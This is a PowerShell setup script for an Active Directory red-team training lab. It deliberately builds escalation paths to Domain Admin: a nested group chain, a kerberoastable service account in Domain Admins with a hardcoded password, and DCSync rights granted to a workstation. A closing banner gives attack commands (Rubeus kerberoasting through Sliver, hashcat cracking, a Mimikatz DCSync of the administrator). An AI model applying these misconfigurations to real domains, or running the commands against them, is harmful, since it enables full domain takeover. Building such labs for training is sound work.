# ============================================================
# ORSUBANK AD RED TEAM LAB - DOMAIN ADMIN PATH CONFIGURATION
# ============================================================
# Script Name: Enable-DomainAdminPath.ps1
# Purpose: Creates vulnerable paths that lead to Domain Admin
# Location: Run on DC01 (Domain Controller)
# 
# WHAT THIS SCRIPT DOES:
# Creates multiple realistic attack paths to Domain Admin:
# 1. A user who is local admin on a server where DA logs in
# 2. Group nesting that leads to Domain Admins
# 3. Service accounts with DA privileges
# ============================================================

# Verify running as Administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[!] ERROR: Run this script as Administrator!" -ForegroundColor Red
    exit 1
}

Import-Module ActiveDirectory -ErrorAction Stop

Write-Host @"

╔══════════════════════════════════════════════════════════════════════════════╗
║              ORSUBANK - DOMAIN ADMIN PATH CONFIGURATION                       ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Creating attack paths that lead to Domain Admin                              ║
║  These simulate real-world misconfigurations found in enterprises             ║
╚══════════════════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor Cyan

# ============================================================
# PATH 1: Nested Group Membership
# ============================================================
# Creates: HelpDesk -> IT_Support -> Server_Admins -> Domain Admins

Write-Host "[*] Creating PATH 1: Nested Group Attack Chain" -ForegroundColor Yellow
Write-Host "    HelpDesk -> IT_Support -> Server_Admins -> Domain Admins" -ForegroundColor Gray

# Create groups
$Groups = @(
    @{Name="HelpDesk_Team"; Description="First-level support staff"},
    @{Name="IT_Support"; Description="Second-level IT support"},
    @{Name="Server_Admins"; Description="Server administrators"}
)

foreach ($Group in $Groups) {
    try {
        New-ADGroup -Name $Group.Name -GroupScope Global -GroupCategory Security -Description $Group.Description -ErrorAction Stop
        Write-Host "    [+] Created group: $($Group.Name)" -ForegroundColor Green
    } catch {
        if ($_.Exception.Message -like "*already exists*") {
            Write-Host "    [=] Group exists: $($Group.Name)" -ForegroundColor Yellow
        }
    }
}

# Create the nesting
try {
    Add-ADGroupMember -Identity "IT_Support" -Members "HelpDesk_Team" -ErrorAction SilentlyContinue
    Add-ADGroupMember -Identity "Server_Admins" -Members "IT_Support" -ErrorAction SilentlyContinue
    Add-ADGroupMember -Identity "Domain Admins" -Members "Server_Admins" -ErrorAction SilentlyContinue
    Write-Host "    [+] Created group nesting chain" -ForegroundColor Green
} catch {}

# Add a regular user to HelpDesk_Team (now they're effectively DA!)
try {
    Add-ADGroupMember -Identity "HelpDesk_Team" -Members "harsha.vardhan" -ErrorAction SilentlyContinue
    Write-Host "    [+] Added harsha.vardhan to HelpDesk_Team" -ForegroundColor Green
    Write-Host "    [!] harsha.vardhan is now effectively a Domain Admin via nesting!" -ForegroundColor Magenta
} catch {}

# ============================================================
# PATH 2: Session Hunting Path
# ============================================================
# lakshmi.devi (DA) has sessions on machines where lower-priv users are admins

Write-Host "`n[*] Creating PATH 2: Session Hunting Scenario" -ForegroundColor Yellow
Write-Host "    lakshmi.devi (DA) sessions can be found on WS01 where vamsi.krishna is admin" -ForegroundColor Gray

# Document that lakshmi.devi should log into WS01/WS02 occasionally
Write-Host "    [!] NOTE: Manually log in as lakshmi.devi on WS01/WS02 to create sessions" -ForegroundColor Magenta
Write-Host "    [!] This creates a 'session hunting' attack path via BloodHound" -ForegroundColor Magenta

# ============================================================
# PATH 3: Service Account with DA Privileges
# ============================================================
# svc_backup is a service account in Domain Admins

Write-Host "`n[*] Creating PATH 3: Privileged Service Account" -ForegroundColor Yellow

$ServiceAccountPassword = ConvertTo-SecureString "Backup@2024!" -AsPlainText -Force
try {
    New-ADUser -Name "svc_backup" `
        -SamAccountName "svc_backup" `
        -UserPrincipalName "svc_backup@orsubank.local" `
        -Path "CN=Users,DC=orsubank,DC=local" `
        -AccountPassword $ServiceAccountPassword `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -Description "Backup Service Account - DO NOT DELETE"
    
    Add-ADGroupMember -Identity "Domain Admins" -Members "svc_backup"
    Write-Host "    [+] Created svc_backup with password: Backup@2024!" -ForegroundColor Green
    Write-Host "    [+] Added svc_backup to Domain Admins" -ForegroundColor Green
    Write-Host "    [!] svc_backup is a service account in DA - crack via Kerberoast!" -ForegroundColor Magenta
} catch {
    if ($_.Exception.Message -like "*already exists*") {
        Write-Host "    [=] svc_backup already exists" -ForegroundColor Yellow
    }
}

# Add SPN so it's kerberoastable
Set-ADUser -Identity "svc_backup" -ServicePrincipalNames @{Add="backup/dc01.orsubank.local"}

# ============================================================
# PATH 4: Computer Account with Excessive Rights
# ============================================================
# WS01$ computer account has DCSync rights (misconfiguration)

Write-Host "`n[*] Creating PATH 4: Computer Account with DCSync" -ForegroundColor Yellow
Write-Host "    WS01$ will have replication rights (DCSync capability)" -ForegroundColor Gray

try {
    $WS01 = Get-ADComputer "WS01" -ErrorAction SilentlyContinue
    if ($WS01) {
        # Get domain DN
        $DomainDN = (Get-ADDomain).DistinguishedName
        
        # Grant replication rights to WS01$
        $Acl = Get-Acl "AD:\$DomainDN"
        $WS01SID = $WS01.SID
        
        # DS-Replication-Get-Changes
        $Ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $WS01SID,
            "ExtendedRight",
            "Allow",
            [GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
        )
        
        # DS-Replication-Get-Changes-All
        $Ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $WS01SID,
            "ExtendedRight",
            "Allow",
            [GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All
        )
        
        $Acl.AddAccessRule($Ace1)
        $Acl.AddAccessRule($Ace2)
        Set-Acl "AD:\$DomainDN" $Acl
        
        Write-Host "    [+] Granted DCSync rights to WS01$ computer account" -ForegroundColor Green
        Write-Host "    [!] If you compromise WS01, you can DCSync!" -ForegroundColor Magenta
    } else {
        Write-Host "    [!] WS01 computer not found - join it to domain first" -ForegroundColor Yellow
    }
} catch {
    Write-Host "    [!] Error configuring DCSync: $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================
# VERIFICATION
# ============================================================

Write-Host "`n" + "=" * 70 -ForegroundColor DarkGray
Write-Host "VERIFICATION" -ForegroundColor Cyan
Write-Host "=" * 70 -ForegroundColor DarkGray

# Check group nesting
Write-Host "`n[*] Checking group nesting..." -ForegroundColor Yellow
$NestCheck = Get-ADGroupMember "Domain Admins" -Recursive | Where-Object {$_.SamAccountName -eq "harsha.vardhan"}
if ($NestCheck) {
    Write-Host "    [+] harsha.vardhan is effectively in Domain Admins" -ForegroundColor Green
}

# Check svc_backup
$SvcBackup = Get-ADUser "svc_backup" -Properties ServicePrincipalName,MemberOf -ErrorAction SilentlyContinue
if ($SvcBackup) {
    Write-Host "    [+] svc_backup exists with SPN: $($SvcBackup.ServicePrincipalName)" -ForegroundColor Green
    if ($SvcBackup.MemberOf -like "*Domain Admins*") {
        Write-Host "    [+] svc_backup is in Domain Admins" -ForegroundColor Green
    }
}

# ============================================================
# ATTACK INSTRUCTIONS
# ============================================================

Write-Host @"

╔══════════════════════════════════════════════════════════════════════════════╗
║                              ATTACK PATHS                                     ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  PATH 1: NESTED GROUP (Best seen in BloodHound)                              ║
║  ─────────────────────────────────────────────                               ║
║  harsha.vardhan -> HelpDesk_Team -> IT_Support -> Server_Admins -> DA       ║
║                                                                              ║
║  Attack: Compromise harsha.vardhan, you're effectively DA!                   ║
║                                                                              ║
║  PATH 2: KERBEROAST svc_backup                                               ║
║  ─────────────────────────────────────────────                               ║
║  [Sliver] > execute-assembly /opt/tools/Rubeus.exe kerberoast                ║
║  [Kali] > hashcat -m 13100 hash.txt rockyou.txt                              ║
║  Password: Backup@2024!                                                      ║
║                                                                              ║
║  PATH 3: DCSync from WS01                                                    ║
║  ─────────────────────────────────────────────                               ║
║  If you get SYSTEM on WS01:                                                  ║
║  [Sliver] > execute-assembly /opt/tools/Mimikatz.exe "lsadump::dcsync /domain:orsubank.local /user:administrator"║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝

"@ -ForegroundColor White

Write-Host "[+] Domain Admin paths configured successfully!" -ForegroundColor Green
